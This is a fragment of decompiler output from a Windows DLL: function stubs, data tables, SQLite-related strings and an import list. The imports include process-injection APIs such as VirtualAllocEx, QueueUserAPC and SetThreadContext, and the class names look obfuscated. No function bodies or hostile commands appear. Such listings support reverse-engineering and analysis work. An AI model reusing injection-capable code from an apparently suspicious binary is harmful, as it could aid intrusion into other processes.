void __cdecl sub_100F3679(); // idb
void __cdecl sub_100F3683(); // idb
void __cdecl sub_100F368D(); // idb
void __cdecl sub_100F3697(); // idb
void __cdecl sub_100F36A1(); // idb
void __cdecl sub_100F36AB(); // idb
void __cdecl sub_100F36B5(); // idb
void __cdecl sub_100F36BF(); // idb
void __cdecl sub_100F36C9(); // idb
void __cdecl sub_100F36D3(); // idb
void __cdecl sub_100F36DD(); // idb
void __cdecl sub_100F36E7(); // idb
void __cdecl sub_100F36F1(); // idb
void __cdecl sub_100F36FB(); // idb
void __cdecl sub_100F3705(); // idb
void __cdecl sub_100F370F(); // idb
void __cdecl sub_100F3719(); // idb
void __cdecl sub_100F3726(); // idb
void __cdecl sub_100F3730(); // idb
void __cdecl sub_100F373A(); // idb
void __cdecl sub_100F3744(); // idb
void __cdecl sub_100F374E(); // idb
void __cdecl sub_100F3758(); // idb
void __cdecl sub_100F3762(); // idb
void __cdecl sub_100F376C(); // idb
void __cdecl sub_100F3776(); // idb
void __cdecl sub_100F3780(); // idb
void __cdecl sub_100F378A(); // idb
void __cdecl sub_100F3794(); // idb
void __cdecl sub_100F379E(); // idb
void __cdecl sub_100F37A8(); // idb
void __cdecl sub_100F37B2(); // idb
void __cdecl sub_100F37BC(); // idb
void __cdecl sub_100F37C6(); // idb
void __cdecl sub_100F37D0(); // idb
void __cdecl sub_100F37DA(); // idb
void __cdecl sub_100F37E4(); // idb
void __cdecl sub_100F37EE(); // idb
void __cdecl sub_100F37F8(); // idb
void __cdecl sub_100F3802(); // idb
void __cdecl sub_100F380C(); // idb
void __cdecl sub_100F3816(); // idb
void __cdecl sub_100F3820(); // idb
void __cdecl sub_100F382A(); // idb
void __cdecl sub_100F3834(); // idb
void __cdecl sub_100F383E(); // idb
void __cdecl sub_100F3848(); // idb
void __cdecl sub_100F3852(); // idb
void __cdecl sub_100F385C(); // idb
void __cdecl sub_100F3866(); // idb
void __cdecl sub_100F3870(); // idb
void __cdecl sub_100F387A(); // idb
void __cdecl sub_100F3884(); // idb
void __cdecl sub_100F388E(); // idb
void __cdecl sub_100F3898(); // idb
void __cdecl sub_100F38A2(); // idb
void __cdecl sub_100F38AC(); // idb
void __cdecl sub_100F38B6(); // idb
void __cdecl sub_100F38C0(); // idb
void __cdecl sub_100F38CA(); // idb
void __cdecl sub_100F38D4(); // idb
void __cdecl sub_100F38DE(); // idb
void __cdecl sub_100F38E8(); // idb
void __cdecl sub_100F38F2(); // idb
void __cdecl sub_100F38FC(); // idb
void __cdecl sub_100F3906(); // idb
void __cdecl sub_100F3910(); // idb
void __cdecl sub_100F391A(); // idb
void __cdecl sub_100F3924(); // idb
void __cdecl sub_100F392E(); // idb
void __cdecl sub_100F3938(); // idb
void __cdecl sub_100F3942(); // idb
void __cdecl sub_100F394C(); // idb
void __cdecl sub_100F3956(); // idb
void __cdecl sub_100F3960(); // idb
void __cdecl sub_100F396A(); // idb
void __cdecl sub_100F3974(); // idb
void __cdecl sub_100F397E(); // idb
void __cdecl sub_100F3988(); // idb
void __cdecl sub_100F3992(); // idb
void __cdecl sub_100F399C(); // idb
void __cdecl sub_100F39A6(); // idb
void __cdecl sub_100F39B0(); // idb
void __cdecl sub_100F39BB(); // idb
void __cdecl sub_100F39C6(); // idb
void __cdecl sub_100F39D0(); // idb
void __cdecl sub_100F39DA(); // idb
void __cdecl sub_100F39E4(); // idb
void __cdecl sub_100F39EE(); // idb
void __cdecl sub_100F39F8(); // idb
void __cdecl sub_100F3A02(); // idb
void __cdecl sub_100F3A0C(); // idb
void __cdecl sub_100F3A16(); // idb
void __cdecl sub_100F3A20(); // idb
void __cdecl sub_100F3A2A(); // idb
void __cdecl sub_100F3A34(); // idb
void __cdecl sub_100F3A3E(); // idb
void __cdecl sub_100F3A48(); // idb
void __cdecl sub_100F3A52(); // idb
void __cdecl sub_100F3A5C(); // idb
void __cdecl sub_100F3A66(); // idb
void __cdecl sub_100F3A70(); // idb
void __cdecl sub_100F3A7A(); // idb
void __cdecl sub_100F3A84(); // idb
void __cdecl sub_100F3A8E(); // idb
void __cdecl sub_100F3A98(); // idb
void __cdecl sub_100F3AA2(); // idb
void __cdecl sub_100F3AAC(); // idb
void __cdecl sub_100F3AB6(); // idb
void __cdecl sub_100F3AC0(); // idb
void __cdecl sub_100F3ACA(); // idb
void __cdecl sub_100F3AD4(); // idb
void __cdecl sub_100F3ADE(); // idb
void __cdecl sub_100F3AE8(); // idb
void __cdecl sub_100F3AF2(); // idb
void __cdecl sub_100F3AFC(); // idb
void __cdecl sub_100F3B06(); // idb
void __cdecl sub_100F3B10(); // idb
void __cdecl sub_100F3B1A(); // idb
void __cdecl sub_100F3B24(); // idb
void __cdecl sub_100F3B2E(); // idb
void __cdecl sub_100F3B38(); // idb
void __cdecl sub_100F3B42(); // idb
void __cdecl sub_100F3B4C(); // idb
void __cdecl sub_100F3B56(); // idb
void __cdecl sub_100F3B60(); // idb
void __cdecl sub_100F3B6A(); // idb
void __cdecl sub_100F3B74(); // idb
void __cdecl sub_100F3B8B(); // idb
void __cdecl sub_100F3B95(); // idb
void __cdecl sub_100F3B9F(); // idb
void __cdecl sub_100F3BA9(); // idb
void __cdecl sub_100F3BB3(); // idb
void __cdecl sub_100F3BBD(); // idb
void __cdecl sub_100F3BC7(); // idb
void __cdecl sub_100F3BD1(); // idb
void __cdecl sub_100F3BDB(); // idb
void __cdecl sub_100F3BE5(); // idb
void __cdecl sub_100F3BEF(); // idb
void __cdecl sub_100F3BF9(); // idb
void __cdecl sub_100F3C03(); // idb
void __cdecl sub_100F3C0D(); // idb
void __cdecl sub_100F3C17(); // idb
void __cdecl sub_100F3C21(); // idb
void __cdecl sub_100F3C2B(); // idb
void __cdecl sub_100F3C35(); // idb
void __cdecl sub_100F3C3F(); // idb
void __cdecl sub_100F3C49(); // idb
void __cdecl sub_100F3C53(); // idb
void __cdecl sub_100F3C5D(); // idb
void __cdecl sub_100F3C67(); // idb
void __cdecl sub_100F3C71(); // idb
void __cdecl sub_100F3C7B(); // idb
void __cdecl sub_100F3C85(); // idb
void __cdecl sub_100F3C8F(); // idb
void __cdecl sub_100F3C99(); // idb
void __cdecl sub_100F3CA3(); // idb
void __cdecl sub_100F3CAD(); // idb
void __cdecl sub_100F3CB7(); // idb
void __cdecl sub_100F3CC1(); // idb
void __cdecl sub_100F3CCB(); // idb
void __cdecl sub_100F3CD5(); // idb
void __cdecl sub_100F3CDF(); // idb
void __cdecl sub_100F3CE9(); // idb
void __cdecl sub_100F3CF3(); // idb
void __cdecl sub_100F3CFD(); // idb
void __cdecl sub_100F3D07(); // idb
void __cdecl sub_100F3D11(); // idb
void __cdecl sub_100F3D1B(); // idb
void __cdecl sub_100F3D25(); // idb
void __cdecl sub_100F3D2F(); // idb
void __cdecl sub_100F3D39(); // idb
void __cdecl sub_100F3D43(); // idb
void __cdecl sub_100F3D4D(); // idb
void __cdecl sub_100F3D57(); // idb
void __cdecl sub_100F3D61(); // idb
void __cdecl sub_100F3D6B(); // idb
void __cdecl sub_100F3D75(); // idb
void __cdecl sub_100F3D7F(); // idb
void __cdecl sub_100F3D89(); // idb
void __cdecl sub_100F3D93(); // idb
void __cdecl sub_100F3D9D(); // idb

//-------------------------------------------------------------------------
// Data declarations

__int16 _ImageBase = 23117; // weak
__int16 word_10000002 = 144; // weak
char byte_100A0606 = '\xCC'; // weak
char byte_100A0632 = '\xCC'; // weak
_UNKNOWN loc_100A064E; // weak
_UNKNOWN loc_100A06CF; // weak
_UNKNOWN loc_100A06ED; // weak
_UNKNOWN loc_100A0EDD; // weak
_UNKNOWN loc_100A2372; // weak
_UNKNOWN loc_100A37EF; // weak
_UNKNOWN loc_100A398C; // weak
_UNKNOWN loc_100A3A0A; // weak
_UNKNOWN loc_100A474D; // weak
_UNKNOWN loc_100A55DB; // weak
_UNKNOWN loc_100A581D; // weak
_UNKNOWN loc_100A582F; // weak
_UNKNOWN loc_100A6045; // weak
_UNKNOWN loc_100A60DB; // weak
_UNKNOWN loc_100A63E5; // weak
_UNKNOWN loc_100A6A73; // weak
_UNKNOWN loc_100A80E1; // weak
_UNKNOWN loc_100A9F2A; // weak
_UNKNOWN loc_100AB66E; // weak
_UNKNOWN loc_100AEDC7; // weak
_UNKNOWN loc_100B012F; // weak
// extern BOOL (__stdcall *DeleteFileW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FileTimeToSystemTime)(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern DWORD (__stdcall *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern DWORD (__stdcall *GetFullPathNameW)(LPCWSTR lpFileName, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *FileTimeToLocalFileTime)(const FILETIME *lpFileTime, LPFILETIME lpLocalFileTime);
// extern BOOL (__stdcall *GetFileInformationByHandle)(HANDLE hFile, LPBY_HANDLE_FILE_INFORMATION lpFileInformation);
// extern BOOL (__stdcall *FlushFileBuffers)(HANDLE hFile);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *LocalFileTimeToFileTime)(const FILETIME *lpLocalFileTime, LPFILETIME lpFileTime);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *SetEnvironmentVariableW)(LPCWSTR lpName, LPCWSTR lpValue);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *GetThreadTimes)(HANDLE hThread, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// extern DWORD (__stdcall *SuspendThread)(HANDLE hThread);
// extern DWORD (__stdcall *ResumeThread)(HANDLE hThread);
// extern BOOL (__stdcall *GetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
// extern HANDLE (__stdcall *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
// extern BOOL (__stdcall *GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
// extern BOOL (__stdcall *SetThreadContext)(HANDLE hThread, const CONTEXT *lpContext);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern DWORD (__stdcall *QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *GetExitCodeProcess)(HANDLE hProcess, LPDWORD lpExitCode);
// extern DWORD (__stdcall *GetCurrentDirectoryW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern UINT (__stdcall *GetWindowsDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern UINT (__stdcall *GetTempFileNameW)(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
// extern UINT (__stdcall *GetSystemDirectoryW)(LPWSTR lpBuffer, UINT uSize);
// extern DWORD (__stdcall *GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern DWORD (__stdcall *TlsAlloc)();
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *ProcessIdToSessionId)(DWORD dwProcessId, DWORD *pSessionId);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *IsBadReadPtr)(const void *lp, UINT_PTR ucb);
// extern BOOL (__stdcall *IsBadStringPtrA)(LPCSTR lpsz, UINT_PTR ucchMax);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *WaitForMultipleObjectsEx)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern SIZE_T (__stdcall *VirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// extern BOOL (__stdcall *VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern HANDLE (__stdcall *CreateFileMappingW)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// extern DWORD (__stdcall *GetTickCount)();
// extern HANDLE (__stdcall *CreateEventW)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern BOOL (__stdcall *ResetEvent)(HANDLE hEvent);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern DWORD (__stdcall *FormatMessageW)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPWSTR lpBuffer, DWORD nSize, va_list *Arguments);
// extern DWORD (__stdcall *FormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// extern BOOL (__stdcall *LockFile)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToLockLow, DWORD nNumberOfBytesToLockHigh);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern UINT (__stdcall *GetACP)();
// extern int (__stdcall *CompareStringW)(LCID Locale, DWORD dwCmpFlags, PCNZWCH lpString1, int cchCount1, PCNZWCH lpString2, int cchCount2);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern DWORD (__stdcall *QueryDosDeviceW)(LPCWSTR lpDeviceName, LPWSTR lpTargetPath, DWORD ucchMax);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern DWORD (__stdcall *GetLogicalDriveStringsW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern HGLOBAL (__stdcall *GlobalFree)(HGLOBAL hMem);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall *RaiseException)(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *DeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetVolumeNameForVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *LockFileEx)(HANDLE hFile, DWORD dwFlags, DWORD dwReserved, DWORD nNumberOfBytesToLockLow, DWORD nNumberOfBytesToLockHigh, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetDiskFreeSpaceW)(LPCWSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters);
// extern BOOL (__stdcall *GetDiskFreeSpaceA)(LPCSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters);
// extern DWORD (__stdcall *GetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern BOOL (__stdcall *AreFileApisANSI)();
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern DWORD (__stdcall *GetFullPathNameA)(LPCSTR lpFileName, DWORD nBufferLength, LPSTR lpBuffer, LPSTR *lpFilePart);
// extern BOOL (__stdcall *UnlockFile)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToUnlockLow, DWORD nNumberOfBytesToUnlockHigh);
// extern LONG (__stdcall *InterlockedCompareExchange)(volatile LONG *Destination, LONG Exchange, LONG Comperand);
void *ikc::izq_ezibc::`vftable' = &sub_1008D05B; // weak
void *nxys_uwip::`vftable' = &sub_1008D149; // weak
void *ikc::qlurhxmnb::`vftable' = &sub_10091692; // weak
_DWORD dword_100FBEAC[5] = { 492561589, 1160641098, -1285694052, -337181359, 0 }; // weak
_UNKNOWN unk_100FBED0; // weak
_UNKNOWN unk_100FBEE0; // weak
const IID riid = { 314u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
__int128 xmmword_100FBF00 = 0x8BFB1EC9A000F29411D0B6BF53F56307i64; // weak
void *ikc::rnp_nhgjjqmxr::`vftable' = &sub_1009E9A4; // weak
int (__thiscall *off_100FBF48[2])(void *Block, char) = { &sub_10001029, &sub_1000802B }; // weak
int (__thiscall *off_100FBF4C)(void *Block, char) = &sub_1000802B; // weak
int (__stdcall *off_100FBF54)(char) = &sub_10008047; // weak
int (__thiscall *off_100FBF5C[2])(void *Block, char) = { &unknown_libname_1, &sub_10007DF9 }; // weak
int (__thiscall *off_100FBF60)(void *Block, char) = &sub_10007DF9; // weak
int (__thiscall *off_100FBFBC[2])(void *, char) = { &sub_10007E84, &sub_10007E21 }; // weak
int (__thiscall *off_100FBFC0)(void *Block, char) = &sub_10007E21; // weak
int (__thiscall *off_100FC020)(void *Block, char) = &sub_10007FA6; // weak
int (__thiscall *off_100FC07C)(void *Block, char) = &sub_10005B95; // weak
int (__thiscall *off_100FC0B0)(void *Block, char) = &sub_100064A0; // weak
int (__thiscall *off_100FC0B8)(void *, char) = &sub_10007F07; // weak
int (__thiscall *off_100FC0F8)(void *Block, char) = &sub_10007EEB; // weak
int (__stdcall *off_100FC154)(char) = &sub_100064BC; // weak
int (__stdcall *off_100FC174)(char) = &sub_100064BC; // weak
int (__stdcall *off_100FC194)(char) = &sub_100064F7; // weak
int (__thiscall *off_100FC1B4)(void *Block, char) = &unknown_libname_2; // weak
int (__thiscall *off_100FC1D4)(void *Block, char) = &unknown_libname_3; // weak
int (__stdcall *off_100FC1F4)(char) = &sub_1000AA7B; // weak
_UNKNOWN unk_100FC1FC; // weak
int (__thiscall *off_100FC204[2])(void *Block, char) = { &sub_1000A7F8, &sub_1000A829 }; // weak
int (__thiscall *off_100FC208)(void *Block, char) = &sub_1000A829; // weak
int (__thiscall *off_100FC268)(void *, char) = &sub_1000A851; // weak
int (__thiscall *off_100FC2A8)(void *Block, char) = &unknown_libname_4; // weak
int (*off_100FC2C8[5])() = { &sub_1000AC9B, &sub_1000ACD3, &sub_1000AC66, &sub_1000AC31, &sub_1000AD4B }; // weak
int (__thiscall *off_100FC2F8)(void *Block, char) = &sub_1000AE1D; // weak
int (__thiscall *off_100FC360)(void *Block, char) = &sub_1000AEC2; // weak
int (__thiscall *off_100FC3C4[2])(void *, char) = { &sub_1000A8B8, &sub_1000B157 }; // weak
int (__thiscall *off_100FC3C8)(void *Block, char) = &sub_1000B157; // weak
char byte_100FC3D0[80] =
{
  '\x19',
  '\x0E',
  '\t',
  '\a',
  '\x05',
  '\x05',
  '\x04',
  '\x04',
  '\x04',
  '\x03',
  '\x03',
  '\x03',
  '\x02',
  '\x02',
  '\x02',
  '\x02',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '\0',
  '\0',
  '|',
  '-',
  '|',
  '-',
  '|',
  '-',
  '|',
  '-',
  '|',
  '\r',
  '\n',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '/',
  '\0',
  '|',
  '\0',
  '\0',
  '\0',
  '|',
  '-',
  '|',
  '-',
  '|',
  '-',
  '|',
  '-',
  '|',
  '\r',
  '\n',
  '\0'
}; // weak
char aOnoffalseyestr[21] = "onoffalseyestruefull"; // weak
_UNKNOWN unk_100FC459; // weak
_UNKNOWN unk_100FC45A; // weak
_UNKNOWN unk_100FC45B; // weak
char byte_100FC45C[8] = { '\0', '\x01', '\x02', '\x04', '\t', '\f', '\x10', '\0' }; // weak
char byte_100FC464[8] = { '\x02', '\x02', '\x03', '\x05', '\x03', '\x04', '\x04', '\0' }; // weak
char byte_100FC46C[] = { '\x01' }; // weak
char *off_100FC478 = "full_column_names"; // weak
_UNKNOWN unk_100FC4E0; // weak
char *off_100FC500[5] = { "delete", "persist", "off", "truncate", "memory" }; // weak
_UNKNOWN unk_100FC514; // weak
_UNKNOWN unk_100FC52C; // weak
_UNKNOWN unk_100FC53C; // weak
_UNKNOWN unk_100FC568; // weak
void *const Src = &aUtf8; // idb
_UNKNOWN unk_100FC5D8; // weak
_UNKNOWN unk_100FC5E4; // weak
char byte_100FC5F0[4] = { 'P', 'N', '\0', '\0' }; // weak
char byte_100FC5F4[4] = { 'B', 'A', '\0', '\0' }; // weak
char byte_100FC5F8[4] = { '@', '>', '\0', '\0' }; // weak
__int16 word_100FC608[1544] =
{
  313,
  49,
  556,
  46,
  147,
  172,
  628,
  598,
  55,
  55,
  55,
  55,
  302,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  603,
  66,
  624,
  623,
  604,
  598,
  591,
  585,
  48,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  51,
  51,
  51,
  50,
  238,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  609,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  598,
  672,
  330,
  411,
  217,
  32,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  330,
  414,
  621,
  620,
  166,
  598,
  673,
  382,
  379,
  378,
  602,
  73,
  591,
  585,
  307,
  424,
  166,
  58,
  377,
  382,
  379,
  378,
  516,
  515,
  624,
  623,
  254,
  200,
  199,
  198,
  377,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  581,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  270,
  226,
  422,
  283,
  133,
  177,
  139,
  284,
  385,
  279,
  384,
  169,
  197,
  251,
  282,
  253,
  226,
  411,
  275,
  440,
  167,
  139,
  284,
  385,
  279,
  384,
  169,
  571,
  236,
  591,
  585,
  240,
  414,
  275,
  622,
  621,
  620,
  674,
  437,
  441,
  442,
  602,
  88,
  352,
  266,
  439,
  268,
  438,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  465,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  471,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  234,
  166,
  491,
  567,
  382,
  379,
  378,
  1,
  440,
  252,
  176,
  624,
  623,
  608,
  67,
  377,
  513,
  622,
  443,
  237,
  577,
  591,
  585,
  622,
  172,
  466,
  598,
  554,
  441,
  340,
  409,
  526,
  580,
  580,
  349,
  596,
  553,
  194,
  482,
  175,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  562,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
